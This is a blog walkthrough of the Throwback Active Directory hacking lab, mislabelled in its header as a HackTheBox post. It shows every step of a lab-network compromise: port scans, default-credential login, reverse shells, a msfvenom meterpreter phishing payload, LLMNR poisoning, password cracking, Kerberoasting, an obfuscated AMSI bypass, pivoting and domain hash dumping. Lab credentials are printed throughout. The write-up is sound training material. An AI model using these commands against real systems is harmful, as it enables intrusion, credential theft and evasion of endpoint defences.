---
layout: post
title: "HackTheBox: Mass Report"
date:   2021-1-19
categories: WriteUp HackTheBox ActiveDirectory
tags: jekyll blog github-page xss
---
### **1. Disclamir**

Introduction

Throwback is an Active Directory (AD) lab that teaches the fundamentals and core concepts of attacking a Windows network. The network simulates a realistic corporate environment that has several attack vectors you would expect to find in today’s organisations.

The lab uses a structured, hand-held approach to guide users through exploiting the network. The use of Windows to manage authentication and user identities in IT infrastructure today is so commonly used; as an aspiring security practitioner, it’s crucial to understand how this works and the network’s common weaknesses.

You will explore the following attacks:

    Phishing & OSINT
    Offensive Powershell
    Active Directory Basics
    Kerberos Abuse
    Custom Malicious Macros
    Active Directory Enumeration & Exploitation
    Attacking Mail Servers
    Firewall Pivoting
    C2 Frameworks
    Abusing Cross-Domain Trusts

This network has been designed to have multiple attack paths.

#### **1.1 Scope**

The network was made up of 11 machines. We only provided the ip address of the public-facing. The scope of the assessment included the following:
![Scope GIF](/assets/img/tryhackme/throwback/machine_layout_1.gif)

**As we got from the gif that we only know 3-IPs of all the machines:**
>Throwback-FW01: 			10.200.154.138

>Throwback-MAIL: 			10.200.154.232

>Throwback-PROD: 			10.200.154.219

There are another 3-machines in our domain.

There are another 5-machines in another domain.

#### **1.2 Summary of Results**
During the time of engagement, I have successfully found several critical vulnerabilities including the
ability to run arbitrary commands on each host mentioned above which could lead to the full compro‑
mise of the Throwback network. Initial reconnaissance was lead us to Throwback-FW01 and Throwback-mail web pages. We used Throwback-FW01 web page to get the first RCE. We used the guest mail/password to login and get all users mails, phishing them and got RCE on Throwback-WS01 which is our second one. From those 2-RCEs we started to compromise all the network.

### **2. Enumeration**
##### **2.1 Throwback-FW01: 10.200.154.138**

**2.1.1 Initial Information**

> The IP address is publicly available: 10.200.154.138

**2.1.2 Enumeration**

**2.1.2.1 nmap initial scan**

`nmap -T4 -p 1-15000 -oN nmap/initial_fw01 10.200.154.138
`

```bash
# Nmap 7.92 scan initiated Wed Dec  1 20:25:17 2021 as: nmap -T4 -p 1-15000 -oN nmap/initial_fw01 10.200.154.138
Nmap scan report for 10.200.154.138
Host is up (0.26s latency).
Not shown: 14996 filtered tcp ports (no-response)
PORT    STATE SERVICE
22/tcp  open  ssh
53/tcp  open  domain
80/tcp  open  http
443/tcp open  https

# Nmap done at Wed Dec  1 20:27:42 2021 -- 1 IP address (1 host up) scanned in 145.09 seconds
```
**2.1.2.2 nmap full scan**

`nmap -A -p22,53,80,443 -oN nmap/all_fw01 10.200.154.138`

```bash
# Nmap 7.92 scan initiated Wed Dec  1 20:29:13 2021 as: nmap -A -p22,53,80,443 -oN nmap/all_fw01 10.200.154.138
Nmap scan report for 10.200.154.138
Host is up (0.30s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.5 (protocol 2.0)
| ssh-hostkey:
|_  4096 38:04:a0:a1:d0:e6:ab:d9:7d:c0:da:f3:66:bf:77:15 (RSA)
53/tcp  open  domain   (generic dns response: REFUSED)
80/tcp  open  http     nginx
|_http-title: Did not follow redirect to https://10.200.154.138/
443/tcp open  ssl/http nginx
| ssl-cert: Subject: commonName=pfSense-5f099cf870c18/organizationName=pfSense webConfigurator Self-Signed Certificate
| Subject Alternative Name: DNS:pfSense-5f099cf870c18
| Not valid before: 2020-07-11T11:05:28
|_Not valid after:  2021-08-13T11:05:28
|_http-title: pfSense - Login
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.92%I=7%D=12/1%Time=61A7BF06%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,E,"\0\x0c\0\x06\x81\x05\0\0\0\0\0\0\0\0");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): FreeBSD 11.X (85%)
OS CPE: cpe:/o:freebsd:freebsd:11.2
Aggressive OS guesses: FreeBSD 11.2-RELEASE (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   239.65 ms 10.50.151.1
2   252.74 ms 10.200.154.138

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Dec  1 20:31:44 2021 -- 1 IP address (1 host up) scanned in 151.39 seconds
```

##### **2.2 Throwback-MAIL: 10.200.154.232**
**2.1.1 Initial Information**

> The IP address of the publicly available web host is 10.200.154.232

**2.2.2 Enumeration**

**2.2.2.1 nmap initial scan**

`nmap -T4 -p 1-15000 -oN nmap/initial_mail 10.200.154.232`

```bash
# Nmap 7.92 scan initiated Wed Dec  1 20:35:12 2021 as: nmap -T4 -p 1-15000 -oN nmap/initial_mail 10.200.154.232
Nmap scan report for 10.200.154.232
Host is up (0.24s latency).
Not shown: 14996 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
143/tcp open  imap
993/tcp open  imaps

# Nmap done at Wed Dec  1 20:36:58 2021 -- 1 IP address (1 host up) scanned in 105.96 seconds
```

**2.2.2.2 nmap full scan**

`nmap -A -p22,80,143,993 -oN nmap/All_mail 10.200.154.232`

```bash
# Nmap 7.92 scan initiated Wed Dec  1 21:27:30 2021 as: nmap -A -p22,80,143,993 -oN nmap/All_mail 10.200.154.232
Nmap scan report for 10.200.154.232
Host is up (0.20s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 f6:14:31:6f:a5:a8:44:bc:5e:c1:bc:1c:5a:75:3d:0b (RSA)
|   256 07:67:60:3f:7f:ba:d4:c5:00:39:51:5e:43:6f:49:b9 (ECDSA)
|_  256 e7:63:66:a8:c7:39:5b:01:bb:4f:b6:af:6c:3d:c2:af (ED25519)
80/tcp  open  http     Apache httpd 2.4.29 ((Ubuntu))
| http-title: Throwback Hacks - Login
|_Requested resource was src/login.php
|_http-server-header: Apache/2.4.29 (Ubuntu)
143/tcp open  imap     Dovecot imapd (Ubuntu)
|_imap-capabilities: SASL-IR STARTTLS more IMAP4rev1 post-login IDLE LOGIN-REFERRALS have listed capabilities ID OK LOGINDISABLEDA0001 Pre-login ENABLE LITERAL+
| ssl-cert: Subject: commonName=ip-10-40-119-232.eu-west-1.compute.internal
| Subject Alternative Name: DNS:ip-10-40-119-232.eu-west-1.compute.internal
| Not valid before: 2020-07-25T15:51:57
|_Not valid after:  2030-07-23T15:51:57
|_ssl-date: TLS randomness does not represent time
993/tcp open  ssl/imap Dovecot imapd (Ubuntu)
|_imap-capabilities: AUTH=PLAINA0001 more IMAP4rev1 post-login IDLE LOGIN-REFERRALS have listed capabilities ID OK SASL-IR Pre-login ENABLE LITERAL+
| ssl-cert: Subject: commonName=ip-10-40-119-232.eu-west-1.compute.internal
| Subject Alternative Name: DNS:ip-10-40-119-232.eu-west-1.compute.internal
| Not valid before: 2020-07-25T15:51:57
|_Not valid after:  2030-07-23T15:51:57
|_ssl-date: TLS randomness does not represent time
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%), Linux 3.2 - 4.9 (92%), Linux 3.7 - 3.10 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 993/tcp)
HOP RTT       ADDRESS
1   149.29 ms 10.50.151.1
2   147.07 ms 10.200.154.232

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Dec  1 21:28:23 2021 -- 1 IP address (1 host up) scanned in 53.11 seconds
```

##### **2.3 Throwback-PROD: 10.200.154.219**

**2.3.1 Initial Information**

> The IP address is publicly available: 10.200.154.219

**2.3.2 Enumeration**

**2.3.2.1 nmap initial scan**
`nmap -T4 -p 1-15000 -oN nmap/initial_prod 10.200.154.219`

```bash
# Nmap 7.92 scan initiated Wed Dec  1 20:54:55 2021 as: nmap -T4 -p 1-15000 -oN nmap/initial_prod 10.200.154.219
Nmap scan report for 10.200.154.219
Host is up (0.24s latency).
Not shown: 14992 filtered tcp ports (no-response)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
5357/tcp open  wsdapi
5985/tcp open  wsman

# Nmap done at Wed Dec  1 20:56:23 2021 -- 1 IP address (1 host up) scanned in 88.30 seconds

```

**2.3.2.2 nmap full scan**

`nmap -A -p22,80,135,139,445,3389,5357,5985 -oN nmap/All_prod 10.200.154.219`

```bash
# Nmap 7.92 scan initiated Wed Dec  1 21:26:57 2021 as: nmap -A -p22,80,135,139,445,3389,5357,5985 -oN nmap/All_prod 10.200.154.219
Nmap scan report for 10.200.154.219
Host is up (0.18s latency).

PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey:
|   2048 85:b8:1f:80:46:3d:91:0f:8c:f2:f2:3f:5c:87:67:72 (RSA)
|   256 5c:0d:46:e9:42:d4:4d:a0:36:d6:19:e5:f3:ce:49:06 (ECDSA)
|_  256 e2:2a:cb:39:85:0f:73:06:a9:23:9d:bf:be:f7:50:0c (ED25519)
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: Throwback Hacks
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2021-12-01T19:36:51+00:00; +8m18s from scanner time.
| rdp-ntlm-info:
|   Target_Name: THROWBACK
|   NetBIOS_Domain_Name: THROWBACK
|   NetBIOS_Computer_Name: THROWBACK-PROD
|   DNS_Domain_Name: THROWBACK.local
|   DNS_Computer_Name: THROWBACK-PROD.THROWBACK.local
|   DNS_Tree_Name: THROWBACK.local
|   Product_Version: 10.0.17763
|_  System_Time: 2021-12-01T19:36:11+00:00
| ssl-cert: Subject: commonName=THROWBACK-PROD.THROWBACK.local
| Not valid before: 2021-11-29T17:08:51
|_Not valid after:  2022-05-31T17:08:51
5357/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Service Unavailable
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 8m17s, deviation: 0s, median: 8m17s
| smb2-time:
|   date: 2021-12-01T19:36:11
|_  start_date: N/A
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled but not required

TRACEROUTE (using port 445/tcp)
HOP RTT       ADDRESS
1   194.29 ms 10.50.151.1
2   190.03 ms 10.200.154.219

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Dec  1 21:28:33 2021 -- 1 IP address (1 host up) scanned in 96.79 seconds

```

### **3 throwback-FW01  10.200.154.138**
#### 3.1 throwback-FW01
We started with throwback-WF01. After exploring the web service we found that it's running `pfsense firewall`.

![WF01-WEB PAGE](/assets/img/tryhackme/throwback/wf1.png)

We tried the default Credentials and it worked.

URL: [http://10.200.154.138](http://10.200.154.138)

    > username: admin
    > password: pfsense

We are in. So, As we know `pfsense firewall` provides a command prompt on the underlying server through the “Diagnostics” tab.
![diagnostics tab](/assets/img/tryhackme/throwback/di-tab.png)

We have 4-ways to get a reverse shell from this point.

    1. Shell
    2. PHP
    3. Upload reverse shell
    4. Add SSH key

Let's check if the shell works.

![ping check](/assets/img/tryhackme/throwback/pingch.png)

![tcpdump](/assets/img/tryhackme/throwback/tcpdump1.png)
`tcpdump step if the shell was blind`

```bash
tcpdump -i tun0 icmp
```

#### 3.2 ThrowBack-FW01 reverse shell

I will use `uploading shell way`

1. Upload shell
![upload_shell_php_wf01](/assets/img/tryhackme/throwback/upload_shell_php.png)
you can download the shell from [shell.php](/assets/shell/shell.php) don't forget to change the ip/port.

2. Netcat listener
![nc_listener_wf01](/assets/img/tryhackme/throwback/wf-nc-check.png)

netcat listener: `nc -lvnp 4444`

#### 3.3 ThrowBack-FW01 looking for interested files
1. First we take a look for log files.

![login.log](/assets/img/tryhackme/throwback/wf-login_log.png)
> login.log isn't a default log file.

We found a user Credentials. Let's try to decode it online.
![](/assets/img/tryhackme/throwback/wf-decode-pass.png)

> HumphreyW:1c13639dba96c7b53d26f7d00956a364:securitycenter

### **4 ThrowBack-Mail  10.200.154.232**
#### 4.1 ThrowBack-mail web service
URL: [http://10.200.154.232](http://10.200.154.232)
![mail-web-1](/assets/img/tryhackme/throwback/mail-serv-1.png)
As you see we found a guest credentials in the home page. We will use them to login.
![mail-web-login](/assets/img/tryhackme/throwback/mail-loing-succ.png)
However, the benefits to us is getting the company’s address book, giving us a nice list of employees, usernames, and their associated e-mail addresses.
![users-email](/assets/img/tryhackme/throwback/users-email.png)


#### 4.2 ThrowBack-mail brute force
We will use hydra to get valid users. We have a users list. So, we need a password list. We have one problem as we don't know the password policy till now. I will use the password list below.
![passes](/assets/img/tryhackme/throwback/pass_creds.png)

You can download users list from [here](/assets/files/tryhackme/throwback/names.txt).

You can download passwords list from [here](/assets/files/tryhackme/throwback/pass.txt).

##### 4.2.1 Hydra
 First, We need to get the user and password parameter in the request. We can get it with `inspect element`
![inspect element](/assets/img/tryhackme/throwback/inspect element.png)
Now, we can run hydra:
```bash
hydra -L names.txt -P pass.txt 10.200.154.232 http-post-form "/src/redirect.php:login_username=^USER^&secretkey=^PASS^:Unknown user or password incorrect"
```
Here we got some valid credentials.

![prod-valid](/assets/img/tryhackme/throwback/prod-valid.png)

Let's combine them together.

![combined](/assets/img/tryhackme/throwback/combined1.png)

#### 4.3 ThrowBack-mail as MurphyF
 After trying the valid credentials we have. I've found that `MurphyF` is the important one. So, let's login as `MurphyF`.

```
url: http://10.200.154.232/
username: MurphyF
password: Summer2020
```

![MurphyFlogin](/assets/img/tryhackme/throwback/murphy-login.png)

From the mail box. We found that there is a mail to reset password. Let's open it.

![resetPassword](/assets/img/tryhackme/throwback/reset_password.png)

The reset link needs to resolve the DNS to its IP, but we don't know it till now. So, Let's save it as a note.

### **5 ThrowBack-WS01  10.200.154.222**

As we logged in as `DaviesJ:Management2018` on the mail-server  [http://10.200.154.232](http://10.200.154.232). We found an email which include a `exe` file. So, we have an option here to use a phishing attack.

**Creating the shell**
```bash
msfvenom -p windows/meterpreter/reverse_tcp lhost=tun0 lport=443 -f exe -o cleaner.exe
```
![cleaner.exe](/assets/img/tryhackme/throwback/reverse_shell.png)

Now, we have to create a phishing mail.

![mail-phishing](/assets/img/tryhackme/throwback/mail-phishing.png)

`Don't forget to change priority to high`

After sending the mail, We will get a callback session.
![reverse_shell_session](/assets/img/tryhackme/throwback/reverse_shell_session2.png)

Check the sysinfo.

![sysinfo_ws01](/assets/img/tryhackme/throwback/sysinfo-ws-01.png)

Here we are. We found a new machine with it's ip `10.200.154.222`

#### 5.1 ThrowBack-WS01

First, we need to migrate our session into a system process. Second, we need to get hashes on this machine.

![ws01-migrate_hashdump](/assets/img/tryhackme/throwback/ws01-migrate_hashdump.png)

After serval attempts of trying to get the hash of `BlaireJ`, but failure was our friend.

### **6 ThrowBack-PROD  10.200.154.219**

First things first, we have a humphrey's credentials. So we will try ssh, but it doesn't work. So we goes towards the web service.

#### 6.1 ThrowBack-prod web service
URL: [http://10.200.154.219](http://10.200.154.219)

After some digging we have nothing interested here.
![prod-web-1](/assets/img/tryhackme/throwback/prod-web-1.png)


Let's back to `ThrowBack-PROD` as there's nothing to do with other machines, we have accessed.

#### 6.2 ThrowBack-PROD SSH brute force.

I've used `hydra` with the credentials we got from throwback-mail. Non of them accessed.


#### 6.3-PROD abusing NBT-NS/LLMNR poisoning.

One of the easiest ways to collect credentials is [abusing NBT-NS/LLMNR poisoning](https://www.cynet.com/attack-techniques-hands-on/llmnr-nbt-ns-poisoning-and-credential-access-using-responder/).

**let's talk about NBT-NS/LLMNR poisoning**

LLMNR(Link-Local Multicast Name Resolution) and NetBIOS Name Service (NBT-NS) are windows domain services that works for host identification.

LLMNR likes DNS: Allows hosts in the local network to use names instead of IPs.

NBT-NS: Used to identify systems on a network by their NetBIOS name.


**LLMNR Poisoning**

You can spoof the source for name resolution on a victim network using responder, a tool used to respond to LLMNR and NBT-NS requests acting as though you know the identity of the host. "Poisoning" the service so that the victims will communicate with our machine. If the host belongs to a resource that requires identification the user and their NTLMv2 hash will be sent to the attacker. These hashes can then be collected from responder and taken offline to be cracked and then used to access the poisoned user's machines or can be taken into PSExec to get a shell.

We will use a tool called [Responder](https://github.com/lgandx/Responder).

1. It will listen to multicast NR (Name Request) requests. It will redirect the victim user to our attacking machine instead of demanded machine.

2. Once the victim tries to connect our machine, Responder will steal users credentials `username/hash`

**Running Responder**
```bash
responder -I tun0 -rdw -v
```
after some minutes we will get a victim. PetersJ is the victim from `ThrowBack-PROD`.

![llmnr_victim](/assets/img/tryhackme/throwback/llmnr_victim.png)

#### 6.4 ThrowBack-PROD cracking password.

We have a hashed password. Let's try to get the password. We will use `hashcat`.

First, you need to download [OneRuleToRuleThemAll](https://github.com/NotSoSecure/password_cracking_rules/blob/master/OneRuleToRuleThemAll.rule).

```bash
hashcat -m 5600 PetersJ.hash /opt/rockyou.txt -r /root/.hashcat/OneRuleToRuleThemAll.rule --debug-mode=1 --debug-file=matched.rule
```
![petersj](/assets/img/tryhackme/throwback/hash_petersj.png)

The password is: `Throwback317`

![peters_decode](/assets/img/tryhackme/throwback/peters_decode.png)

#### 6.5 ThrowBack-PROD SSH.

Using those credentials to ssh ThrowBack-PROD.

Password: `Throwback317`

```bash
ssh PetersJ@10.200.154.219
```

#### 6.6 ThrowBack-PROD Privilege Escalation.

After checking our rights, We found that we need to escalate our privileges. So, I used starkiller `seatbelt` module. You can run it from windows or use winpeas.

[seatbelt](https://github.com/GhostPack/Seatbelt)

[winpeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)

We found a AutoLogon credentials:

>username : BlaireJ

>Password : 7eQgx6YzxgG3vC45t5k9

![BlaireJ](/assets/img/tryhackme/throwback/prod_privilege_escalation.png)


![bairej_admin_prod](/assets/img/tryhackme/throwback/bairej_admin_prod.png)

    ##### 3.5.6 ThrowBack-PROD useful data.


Now, we finished this machine, but we need something to use in the next step:

1. What is the IP of `timekeep.throwback.local`
2. What is the Domain Controller IP.
3. Use this machine as a pivot to access other machines.

Let's start with `timekeep.throwback.local`

we will use `nslookup`

```bash
nslookup THROWBACK-TIME.throwback.local
```
![timekeep_ip](/assets/img/tryhackme/throwback/timekeep_ip.png)


To get Domain Controller IP.

```bash
ipconfig /displaydns
```

![domain_controller_ip](/assets/img/tryhackme/throwback/domain_controller_ip.png)

```
THROWBACK-TIME.throwback.local : 10.200.154.176
THROWBACK-DC01.throwback.local : 10.200.154.117
```
let's edit our hosts file
```bash
echo "10.200.154.176  timekeep.throwback.local" >> /etc/hosts
```



### 7. Pivot using ThrowBack-PROD session

We will use the autoroute module from Metasploit Framework. We need a meterpreter session.

1. Pause Amsi.
2. create a reverse shell as we did before for mail phishing.
3. start the listener on msfconsole.

Pausing Amsi.

```bash
sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."AssEmbly"."GETTYPe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."getfiElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sETVaLUE"( ${nULl},${tRuE} )
```

The past command is :`[Ref].Assembly.GetType(‘System.Management.Automation.AmsiUtils’).GetField(‘amsiInitFailed’,’NonPublic,Static’).SetValue($null,$true)`

After getting the reverse shell.

![autoroute_prod](/assets/img/tryhackme/throwback/autoroute_prod.png)

then we will use socks_server module  and run it.

![socks_proxy](/assets/img/tryhackme/throwback/socks_proxy.png)

edit proxychains config file.

![proxychains_file](/assets/img/tryhackme/throwback/proxychains_file.png)

1. There is 2-versions of proxychains v4/v5. Make sure the version you use from metasploit the same as you use from bash.
2. The same port you use in socks_proxy as conf file.

Check

As we know previsouly that ThrowBack-WS01 port `445` is open. We will check it with using pivot. We can't check other ports as we don't know they open/closed.

![with_proxychains](/assets/img/tryhackme/throwback/with_proxychains.png)

Now, Our proxychains works as expected. So, Let's detect other machines `DC01 and timekeep`.


----
### 8. **ThrowBack-Time 10.200.154.176**

#### 8.1 SSH

credentials: Timekeeper: keeperoftime

----
#### 8.2 SPN
After checking the opening ports we found that port 3306 is opened. As we know that port related to mysql. Also most of times SQLService accounts will have an SPN. So let's check it.

`proxychains GetUserSPNs.py -dc-ip 10.200.154.117 THROWBACK.LOCAL/BlaireJ:7eQgx6YzxgG3vC45t5k9`

![spn1](/assets/img/tryhackme/throwback/spn1.png)

As we expected that SQLService is vulnerable. Let's try to catch the flag. Let's get it by using `-request`

`proxychains GetUserSPNs.py -dc-ip 10.200.154.117 THROWBACK.LOCAL/BlaireJ:7eQgx6YzxgG3vC45t5k9 -request`

![spn_2_2](/assets/img/tryhackme/throwback/spn_2_2.png)

If you have an error like `Kerberos SessionERROR: KRB_AP_ERR_SKEW(Clock skew too great)` you need to sync the time with the AD server
`proxychains rdate -n 10.200.154.117`
or
`proxychains ntpd 10.200.154.117`

Now, we have the hash let's retrieve it to plain text.

`john --wordlist=~/tools/rockyou.txt hashes/sql_server`

![spn_2_3](/assets/img/tryhackme/throwback/spn_2_3.png)

#### 8.3 MYSQL
`password: mysql1337570`

Let's dump the database.

![mysql1](/assets/img/tryhackme/throwback/mysql1.png)

```bash
1. show databases;
2. use domain_users;
3. show tables;
```

![sql4](/assets/img/tryhackme/throwback/sql4.png)


```bash
1. show databases;
2. use timekeepusers;
3. show tables;
```

![sql2](/assets/img/tryhackme/throwback/mysql32.png)

### 9. **ThrowBack-DC01     10.200.154.117**

Now, we have a list of users and passwords. Let's try to use all of them.

1.  Add them to valid credentials that we have before.
2.  Brute force for valid credentials using cme.

`proxychains crackmapexec smb 10.200.154.117 -u users.timekeeper -p pass.timekeeper`

Download: [users.timekeeper](/assets/files/tryhackme/throwback/users.timekeeper.txt)

Download: [pass.timekeeper](/assets/files/tryhackme/throwback/pass.timekeeper.txt)

![dc01-1](/assets/img/tryhackme/throwback/dc01-1.png)

#### 9.1 ThrowBack-DC01 SSH
Now, we have a valid credentials to domain controller. Let's connect!

![dc01-ssh_connect](/assets/img/tryhackme/throwback/dc01-ssh_connect.png)


![dc01-ssh2](/assets/img/tryhackme/throwback/dc01-ssh-2.png)

#### 9.2 ThrowBack-DC01 BackUp users.

Now, we will take a look for all text files in all users files.

`dir /s /a *.txt`

![dir_dc01-1](/assets/img/tryhackme/throwback/dir_dc01-1.png)

![backup_notes](/assets/img/tryhackme/throwback/backup_notes.png)

We found a very interested file called `backup_notice.txt`. We have to read it.

![backupnotice](/assets/img/tryhackme/throwback/backupnotice.png)

There's a password to the backup user. Let's login with those new credentials `backup:TBH_Backup2348!`

![backup_afterlogin](/assets/img/tryhackme/throwback/backup_afterlogin.png)

#### 9.3 ThrowBack-DC01 dumping hashes.

We will go for dumping all users hashes.

![secretdump1](/assets/img/tryhackme/throwback/secretdump1.png)

![secretdump2](/assets/img/tryhackme/throwback/secretdump2.png)

```bash
hashcat -m 1000 mercerh /opt/rockyou.txt  -r /root/.hashcat/OneRuleToRuleThemAll.rule
```
![secretdump4](/assets/img/tryhackme/throwback/secretdump4.png)

![secretdump3](/assets/img/tryhackme/throwback/secretdump3.png)

#### 9.4 ThrowBack-DC01 with mercerh.

![mercerh1](/assets/img/tryhackme/throwback/mercerh1.png)

check MercerH privileges.

![mercerh2](/assets/img/tryhackme/throwback/mercerh2.png)

Now, As we got that mercerh is an admin in the domain controller. So, we have nothing to do in this forest. Let's look for another forest.


I will use  C2 module. You can use powerview/ActiveDirectory modules.


![num1](/assets/img/tryhackme/throwback/num1.png)

![num2](/assets/img/tryhackme/throwback/num2.png)

![num3](/assets/img/tryhackme/throwback/num3.png)

![num4](/assets/img/tryhackme/throwback/num4.png)

![num5](/assets/img/tryhackme/throwback/num5.png)

Let's remark our notes.
1. Another domain `corporate.local`
2. `10.200.154.118` for `CORP-DC01.corporate.local`
3. `10.200.154.243` for `CORP-ADT01.corporate.local`

### 10. **Pivot using ThrowBack-DC01 session**

Now, we have a trusted forest `corporate.local` with the trusted user `MercerH`. We can't use our current pivot session `ThrowBack-Prod` as `corporate.local` trust `ThrowBack-DC01`. We have to use `ThrowBack-DC01` as a new pivot session.

![pivot2](/assets/img/tryhackme/throwback/pivot2.png)

```
1. we have 2-sessions session2 from ThrowBack-prod and session3 from ThrowBack-DC01.
2. Delete the old routing session.
3. Add the new routing session.
```

### 11. **Corporate-DC01 10.200.154.118**

#### 11.2 Corporate-DC01 with mercerh

Let's connect to the new forest with the credentials we have. Now, you have to change the route to corporate-dc01 session.

![corporate1](/assets/img/tryhackme/throwback/corporate1.png)

### **12 Corporate-ADT01 10.200.154.243**

#### 12.1 Corporate-ADT01 with DaviesJ
We logged in, but we aren't the admin. let's take a look.

![server_status1](/assets/img/tryhackme/throwback/server_status1.png)

There's a interested file called `server_update.txt`. Let's check it.

![server_status2](/assets/img/tryhackme/throwback/server_status2.png)

It a note about using the DNS of 10.200.154.232 . As we know previsouly that this the mail server. So let's add them.

```bash
echo "10.200.154.232  mail.corporate.local breachgtfo.local" >> /etc/hosts
```

**breachgtfo.corporate.local**

![site1](/assets/img/tryhackme/throwback/site1.png)

**mail.corporate.local**

![site2](/assets/img/tryhackme/throwback/site2.png)

Now, we tried all our emails and non worked. So we need to look for other email to test in data leaks. First, I will use the sites that recommended for finding users and projects `linkedin and GitHub`.

![social_1](/assets/img/tryhackme/throwback/social_1.png)

After trying all users we found, there is a user who have a good note.

![social_2](/assets/img/tryhackme/throwback/social_2.png)

Rikka Foxx told us that he is the developer. So let's check his gitub account.

![social_2_5](/assets/img/tryhackme/throwback/social_2_5.png)


![social_3](/assets/img/tryhackme/throwback/social_3.png)

After opening the ThrowBack project. There's a 9-commits. let's get them.

![social_4](/assets/img/tryhackme/throwback/social_4.png)

There's a interesting update in `db_connect.php`.

![social_5](/assets/img/tryhackme/throwback/social_5.png)

There's a credentials.
`DaviesJ:Management2018`


Let's use Powershell to get a shell here. The xfreerdp window that we have for `proxychains xfreerdp /u:mercerh /p:pikapikachu7 /cert:ignore /v:10.200.154.118`


```
Enter-PSSession -ComputerName corp-adt01.corporate.local  -Credential corporate\DaviesJ
```

![emai__2](/assets/img/tryhackme/throwback/emai__2.png)

It will popup a window to enter the password `Management2018`

![popup](/assets/img/tryhackme/throwback/popup.png)

Let's check our privileges.

![atd_2](/assets/img/tryhackme/throwback/atd_2.png)

### 13. **TBSEC-DC01 10.200.154.79**


#### 13.1 TBSEC-DC01 As TBSEC_GUEST

There's a file called `email_update.txt` in `Dosierk\Document`. Let's check it.

![email__3](/assets/img/tryhackme/throwback/email__3.png)

We will use the given mail formate for all users. Let's get the user list with [LeetLinked](https://github.com/Sq00ky/LeetLinked).

`python3 leetlinked.py -e "throwback.local" -f 1 "Throwback Hacks"`

When we run this the output will give us 4 emails.

![last_email](/assets/img/tryhackme/throwback/last_email.png)

Now let's convert them to the formate.

```
sed -i 's/throwback.local/TBHSecurity.com/g' last_emails
```

Try the next command with every department
```
sed -n '/@/{s|^|ESM-|};p' last_emails
```

![sort_u](/assets/img/tryhackme/throwback/sort_u.png)

After some trying. There's a user with leaked credentials.

![breach_1](/assets/img/tryhackme/throwback/breach_1.png)

Now, Let's login with it's credentials.

`JStewart:aqAwM53cW8AgRbfr`

![breach_2](/assets/img/tryhackme/throwback/breach_2.png)

There's a credentials.

`TBSEC_GUEST:WelcomeTBSEC1!`


![tbsec-dc01-](/assets/img/tryhackme/throwback/tbsec-dc01-1.png)


![tbsec-dc01-2](/assets/img/tryhackme/throwback/tbsec-dc01-2.png)

#### 13.2 TBSEC-DC01 As TBSEC_GUEST

After some enumeration. I found that there's a user with an admin access called `TBService`. From the name that's a service user. After get it's SPN, I decided to Kerberoasing it.

We did before with `Impacket`. So let's do it in another way with [Rubeus](https://github.com/GhostPack/Rubeus). I got the shell to C2 `you can do it form shell.`

![kerberoasting_rebu](/assets/img/tryhackme/throwback/kerberoasting_rebu.png)

The result is:

![kerberoasting_rebu2](/assets/img/tryhackme/throwback/kerberoasting_rebu2.png)


![kerberoasting_rebu3](/assets/img/tryhackme/throwback/kerberoasting_rebu3.png)



Let's crack the hash.

![last_hash1](/assets/img/tryhackme/throwback//last_hash1.png)


![last_hash2](/assets/img/tryhackme/throwback/last_hash2.png)

LOGIN:

runas /tbservice "cmd.exe"

![login_1](/assets/img/tryhackme/throwback/login_1.png)


